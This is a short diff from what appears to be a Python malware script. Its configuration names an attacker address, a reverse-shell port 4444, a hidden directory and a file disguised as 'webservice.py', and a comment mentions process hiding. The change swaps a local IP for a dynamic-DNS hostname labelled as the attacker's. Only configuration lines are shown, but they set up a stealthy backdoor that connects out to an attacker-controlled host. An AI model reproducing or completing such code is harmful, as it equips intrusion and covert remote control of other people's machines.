@@ -6,7 +6,7 @@ import psutil  # pip install psutil for process hiding
 import time
 
 # Configuration
-ATTACKER_IP = "192.168.1.100"  # Attacker's IP
+ATTACKER_IP = "botconnect.ddns.net"  # Attacker's IP
 PORT = 4444  # Port for reverse shell and server
 HIDDEN_DIR = "/var/tmp/.webservice"  # Hidden directory
 HIDDEN_FILE = f"{HIDDEN_DIR}/webservice.py"  # Hidden file
